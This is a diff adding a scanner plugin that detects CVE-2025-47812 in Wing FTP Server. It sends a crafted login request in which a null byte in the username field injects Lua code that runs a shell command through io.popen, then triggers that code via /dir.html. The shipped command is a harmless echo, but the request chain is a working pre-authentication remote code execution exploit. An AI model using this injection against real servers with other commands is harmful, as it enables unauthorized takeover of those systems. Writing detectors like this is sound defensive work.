@@ -1,0 +1,137 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "WingFtp_CVE_2025_47812"
+  author: "fuzzychick"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "WINGFTP_CVE_2025_47812"
+  }
+  severity: CRITICAL
+  title: "Wing FTP Server is vulnerable to remote code execution"
+  description: "The instance of Wing FTP Server is vulnerable to pre-authentication remote code execution (CVE-2025-47812). This detection executes a safe echo payload to verify remote command execution without performing destructive actions."
+  recommendation: "Update to a version 7.4.4 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-47812"
+  }
+}
+
+config: {
+  debug: true
+}
+
+###############
+# ACTIONS     #
+###############
+
+# Action: Fingerprint Wing FTP Server
+actions: {
+  name: "fingerprint_wingftp"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { header: { name: "Server" } contains: "Wing FTP Server" }
+        ]
+      }
+    }
+  }
+}
+
+# Action: POST to /loginok.html with crafted username payload
+actions: {
+  name: "get_UID_cookie"
+  http_request: {
+    method: POST
+    uri: "/loginok.html"
+    headers: [
+      { name: "User-Agent" value: "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0" },
+      { name: "Accept" value: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" },
+      { name: "Accept-Language" value: "en-US,en;q=0.5" },
+      { name: "Accept-Encoding" value: "gzip, deflate, br" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Connection" value: "keep-alive" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}/login.html?lang=english" },
+      { name: "Cookie" value: "client_lang=english" },
+      { name: "Upgrade-Insecure-Requests" value: "1" },
+      { name: "Priority" value: "u=0, i" }
+    ]
+    data: "username={{ username }}%00]]%0dlocal+h+%3d+io.popen(\"{{ payload }}\")%0dlocal+r+%3d+h%3aread('*a')%0dh%3aclose()%0dprint(r)%0d--&password="
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "UID=([a-f0-9]+)"
+            variable_name: "uid"
+          }
+        ]
+      }
+    }
+  }
+}
+
+# Action: POST to /dir.html with the UID cookie to retrieve command output
+actions: {
+  name: "trigger_rce_via_dir"
+  http_request: {
+    method: POST
+    uri: "/dir.html"
+    headers: [
+      { name: "User-Agent" value: "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0" },
+      { name: "Accept" value: "text/html,application/xhtml+xml,application/xml" },
+      { name: "Accept-Language" value: "en-US,en;q=0.5" },
+      { name: "Accept-Encoding" value: "gzip, deflate, br" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Connection" value: "keep-alive" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}/login.html?lang=english" },
+      { name: "Cookie" value: "client_lang=english; UID={{ uid }}" },
+      { name: "Upgrade-Insecure-Requests" value: "1" },
+      { name: "Priority" value: "u=0, i" }
+    ]
+    data: "1"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ payload_result }}" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "username" value: "anonymous" },
+    { name: "payload" value: "echo tsunami$((7*7))" },
+    { name: "payload_result" value: "tsunami49" }
+  ]
+
+  actions: [
+    "fingerprint_wingftp",
+    "get_UID_cookie",
+    "trigger_rce_via_dir"
+  ]
+}
